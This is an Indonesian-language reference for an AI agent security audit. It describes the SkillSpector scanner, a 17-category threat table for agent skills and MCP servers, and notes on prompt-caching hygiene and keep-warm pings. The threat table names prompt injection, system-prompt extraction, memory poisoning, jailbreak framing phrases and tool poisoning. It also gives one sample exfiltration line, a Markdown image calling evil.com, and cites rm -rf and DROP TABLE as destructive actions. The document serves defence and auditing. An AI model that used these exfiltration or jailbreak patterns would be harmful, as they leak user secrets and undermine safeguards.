# SkillSpector & Cache-Keeper Reference

> **Context**: Referensi audit keamanan AI Agent Skills, tool manifest Model Context Protocol (MCP), dan optimasi Prompt Caching untuk pipeline `security-audit`.

---

## 1. NVIDIA SkillSpector

- **Repositori**: `https://github.com/NVIDIA/SkillSpector`
- **Lisensi**: Apache-2.0
- **Tujuan**: Security scanner statis dan semantik multi-stage yang dirancang khusus untuk menganalisis AI agent skills, instruksi custom, konfigurasi tools, dan server MCP sebelum diinstal atau dieksekusi.

### Arsitektur Evaluasi Two-Stage:
1. **Stage 1 (Fast Static Analysis)**: Regex pattern matching, AST parsing (Python/JS/TS), YARA signatures untuk payload/malware biner, taint tracking, serta pengecekan CVE dependensi via OSV.dev.
2. **Stage 2 (LLM Semantic Analysis)**: Evaluasi niat dan konteks untuk menyaring false positives dan mendeteksi bahaya berbasis logika.
3. **Scoring**: Skor risiko terpadu 0–100, severity grading, dan output kompatibel SARIF/JSON/Markdown untuk integrasi CI/CD.

---

## 2. 17 Kategori Audit Keamanan AI Agent Skills & MCP

| No | Kategori | Fokus & Vektor Ancaman |
|:---|:---|:---|
| **01** | **Prompt Injection** | Direct/indirect instruction override, hidden directives di file teks/markdown, zero-width spaces, token manipulation. |
| **02** | **Data Exfiltration** | Pengiriman data kredensial/rahasia ke luar tanpa izin via HTTP webhooks, DNS tunneling, Markdown image embedding (`![img](https://evil.com?c=...)`). |
| **03** | **Privilege Escalation** | Bypass batas sandbox, akses host filesystem di luar root workspace, penyalahgunaan `sudo`, manipulasi permissions. |
| **04** | **Supply Chain** | Dependensi berbahaya/typosquatting di `package.json`/`requirements.txt`, unpinned packages, live lookup database OSV.dev. |
| **05** | **Excessive Agency** | Tool calling destruktif otonom tanpa konfirmasi pengguna (misal: otomatis `rm -rf`, `DROP TABLE`, kirim email massal). |
| **06** | **Output Handling** | Eksekusi atau perenderan output LLM secara tidak aman (XSS via innerHTML yang tidak disanitasi, eval injection). |
| **07** | **System Prompt Leakage** | Teknik jailbreak/ekstraksi yang memaksa agen membocorkan master prompt, proprietary instructions, atau secret keys. |
| **08** | **Memory Poisoning** | Manipulasi memori jangka panjang agent (`PROJECT_CONTEXT.md`, SQLite memory, vectors) untuk mengubah perilaku di sesi berikutnya. |
| **09** | **Tool Misuse** | Pemanggilan fungsi/tool internal dengan parameter berbahaya, format injection, atau melewati validator skema. |
| **10** | **Rogue Agent** | Recursive tool invocation tanpa batas (infinite loop), subagent fork-bombing, penghabisan kuota komputasi/token. |
| **11** | **Anti-Refusal** | Pola framing ("in a fictional scenario", "roleplay bypass", reverse psychology) untuk meruntuhkan guardrails keselamatan. |
| **12** | **Trigger Abuse** | Deskripsi skill atau keywords yang dibuat terlalu rakus/menyesatkan sehingga merebut prioritas aktivasi skill lain secara ilegal. |
| **13** | **Dangerous Code (AST)** | Deteksi via Abstract Syntax Tree terhadap fungsi terlarang (`eval()`, `exec()`, `os.system()`, `child_process.exec()`, dynamic imports). |
| **14** | **Taint Tracking** | Pelacakan aliran data eksternal yang tidak disanitasi dari sumber (source: web, input user) menuju fungsi eksekusi kritis (sink: bash, db, filesystem). |
| **15** | **YARA Signatures** | Deteksi binary signatures untuk reverse shells, web shells, miners, encoded PowerShell base64, dan artefak malware klasik. |
| **16** | **MCP Least Privilege** | Server MCP yang meminta izin berlebihan (wildcard permissions, akses semua direktori saat hanya butuh satu file, scopes tak terbatas). |
| **17** | **MCP Tool Poisoning** | Shadowing tool resmi dengan tool tiruan berbahaya, deskripsi tool yang membohongi model untuk mengirimkan argumen sensitif. |

---

## 3. Catatan Cache-Keeper (Prefix Hygiene & Prompt Cache TTL)

### A. Prefix Hygiene (Integritas Caching Prompt)
LLM Prompt Caching (seperti pada Anthropic Claude atau model tiering enterprise) menghemat biaya hingga 90% dan memangkas latency (TTFT) hingga 80% dengan menyimpan Key-Value (KV) tensors. Namun, caching menuntut **kesamaan karakter 100% dari awal (prefix)**:

1. **Static-First, Dynamic-Last Architecture**:
   - Bagian statis yang jarang berubah (System Master Prompt, Tool Schemas, Guideline Tetap) diletakkan di **paling depan**.
   - Bagian dinamis (riwayat chat terbaru, timestamp runtime, pesan input user saat ini) diletakkan di **paling akhir**.
2. **Frozen Snapshot Pattern**:
   - Konfigurasi sesi (aturan kerja, project context snapshot) dibekukan pada turn pertama sesi. Dilarang memodifikasi blok sistem utama di tengah sesi karena 1 karakter spasi atau pergeseran urutan key JSON akan membatalkan seluruh cache (cache bust).
3. **Ephemeral Injections**:
   - Jika membutuhkan instruksi sementara per turn, sisipkan sebagai parameter pesan khusus (`message-level context`) alih-alih mengedit blok system prompt dasar yang sedang di-cache.

### B. Prompt Cache TTL & Keep-Warm Dynamics
1. **TTL Lifecycles**:
   - **Ephemeral Default**: Mayoritas API memberlakukan TTL 5 menit (~270–300 detik) sejak panggilan terakhir.
   - **Extended Tiers**: Paket langganan/tier enterprise tertentu menyediakan retensi 1 jam (`1h`).
2. **Cold Restart Cliff Penalty**:
   - Jika pengguna idle melebihi jendela TTL, sesi mengalami cold restart. Panggilan berikutnya harus memproses ulang seluruh context window dari nol dengan tarif write penuh, meningkatkan biaya dan waktu respons.
3. **Cache Keeper Keep-Warm Pattern**:
   - Pola keep-warm mengirimkan ping otomatis bernilai token minimal (misal `max_tokens: 1` dengan prefix identik) tepat sebelum batas TTL habis (~menit ke-4 untuk jendela 5 menit).
   - **Safety Budget Cap**: Wajib memiliki hard limit biaya per jam agar proses keep-warm tidak berjalan liar jika sesi ditinggal lama.
4. **Perintah Manajemen**:
   - `/cache`: Periksa status kesehatan prompt cache dan sisa waktu TTL.
   - `/keepwarm`: Aktifkan interval ping latar belakang hemat biaya.
   - `/handoff`: Buat ringkasan padat dan transisikan konteks ke sesi baru saat konteks sudah terlalu panjang untuk menjaga efisiensi token.
